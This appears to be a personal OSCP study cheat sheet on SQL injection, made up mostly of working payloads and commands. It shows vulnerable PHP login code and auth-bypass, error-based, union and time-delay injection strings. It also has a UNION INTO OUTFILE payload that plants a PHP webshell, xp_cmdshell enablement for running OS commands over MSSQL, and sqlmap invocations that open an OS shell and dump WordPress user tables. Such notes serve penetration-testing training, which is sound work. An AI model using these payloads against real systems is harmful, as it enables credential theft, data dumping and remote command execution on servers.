## Basic SQL Reminders

### For OSCp

 - mysql
 - sqlserver

MySql

Connecting:

mysql -u <username> -p <password> -h <host ip> -p <port> 
	
Important Functions etc
 - version : shows running version
 - select system_user() : returns current user name and host names
 - show databases;
 - select user, authentication_string FROM mysql.user WHERE user = '';
 
 
SQL Server
 
Connecting:
 	impacket-mssqlclient <username>:<password>@<ip of box> -windows-auth

Important Functions etc
 - select @@version
 - select name FROM sys.databases
 - select * from offsec.infromation_schema.tables
 - select * fro offsec.dbo.users

 #### id'ing sqli
 <?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name = '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>

offsec' OR 1=1 -- //
' OR 1=1 in (select @@version) -- //



### Generic

Using the mysql command, we'll connect to the remote SQL instance by specifying root as username and password, along with the default MySQL server port 3306.
> mysql -u root -p'root' -h 192.168.50.16 -P 3306

We can run impacket-mssqlclient to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the -windows-auth keyword. 
> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

Basic escape chars to try
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

Comments for diff dbs
```
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
````


https://medium.com/@harrmahar/escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90

## error-based payload
```
' or 1=1 in (select @@version) -- //
```

## manual sqli via error-based payloads

```
uid=' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //&password=test
```

## find num of columns
```
' ORDER BY 10-- //
```

## union select to create a webshell
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

## connecting via impacket-mssqlclient
note: my install is wonky and need to run it as mssqlclient.py Administrator:Lab123@192.168.206.18 -windows-auth
```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```
we can now excute windows shell commands



## using sqlmap with -r
```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```
where post.txt contains the post request from burp

```
sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T --flush-session
```

GET /wp-admin/admin-ajax.php?action=get_question&question_id=1* HTTP/1.1
Host: alvida-eatery.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1



# time delay

```
'; IF (1=1) WAITFOR DELAY '0:0:10';-- 
```